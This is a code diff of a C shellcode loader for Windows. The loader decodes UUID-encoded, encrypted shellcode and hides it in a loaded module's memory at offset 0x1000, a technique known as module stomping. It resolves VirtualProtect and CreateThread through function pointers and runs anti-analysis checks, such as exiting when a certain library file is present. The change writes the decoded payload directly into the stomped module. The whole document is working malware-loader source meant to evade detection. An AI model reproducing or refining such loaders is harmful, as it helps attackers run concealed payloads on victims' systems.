@@ -1,7 +1,6 @@
 
 #include <Windows.h>
 #include <TlHelp32.h>
-#include <stdio.h>
 
 #pragma comment (lib, "Rpcrt4.lib")
 
@@ -27,7 +26,7 @@ char decKey[] = "DECKEY";
 
 char *uuids[] = "UUIDs";
 
-unsigned char pShell[SHELLSIZE]; 
+unsigned char *pShell; 
 
 VirtualProtectFunc pVirtualProtectFunc;
 CreateThreadFunc pCreateThreadFunc;
@@ -67,39 +66,14 @@ void decShell()
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {  
     DWORD_PTR pFuncAddr, pShellReader;
-    DWORD dwOldProtect = 0, dwProcId;
+    DWORD dwOldProtect = 0;
     HMODULE hModule, hModule2;
-    HANDLE hThread, hSnapshot;
+    HANDLE hThread;
     BOOL bTrap = FALSE;
     char *pMem;
     int nMemAlloc, nCtr = 0;
-    PROCESSENTRY32 pe32;
-    FILE *pFile;
 
-    dwProcId = GetCurrentProcessId();
-    
-    if ((hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, dwProcId)))
-    {
-        if (Process32First(hSnapshot, &pe32)) 
-        {
-            do {
-                if (pe32.th32ProcessID == dwProcId)
-                {
-                    if (!(pFile = fopen((LPCSTR)pe32.szExeFile, "rb")))
-                    {
-                        return EXIT_FAILURE;
-                    } else {
-                        fclose(pFile);
-                        break;
-                    }
-                }
-            } while (Process32Next(hSnapshot, &pe32));
-        }
-
-        CloseHandle(hSnapshot);
-    } 
-
-    if (pFile = fopen(cLib2Name, "rb"))
+    if (CreateFileA(cLib2Name, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_READONLY, NULL) != INVALID_HANDLE_VALUE)
     {
         return EXIT_FAILURE;
     }
@@ -144,7 +118,14 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
         return EXIT_FAILURE;
     }
 
+    pFuncAddr = (DWORD_PTR) hModule2 + 0x1000;
+    pShell = (unsigned char *) pFuncAddr;
     pShellReader = (DWORD_PTR) pShell;
+
+    if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, PAGE_READWRITE, &dwOldProtect) == 0)
+    {
+        return EXIT_FAILURE;
+    }
 
     for (int idx = 0; idx < sizeof(uuids) / sizeof(PCHAR); idx++)
     {
@@ -158,14 +139,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
 
     free(pMem);
     decShell();
-    pFuncAddr = (DWORD_PTR) hModule2 + 0x1000;
     
-    if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, PAGE_READWRITE, &dwOldProtect) == 0)
-    {
-        return EXIT_FAILURE;
-    }
-
-    RtlCopyMemory((LPVOID)pFuncAddr, pShell, SHELLSIZE);
 
     if (pVirtualProtectFunc((LPVOID)pFuncAddr, SHELLSIZE, dwOldProtect, &dwOldProtect) == 0)
     {
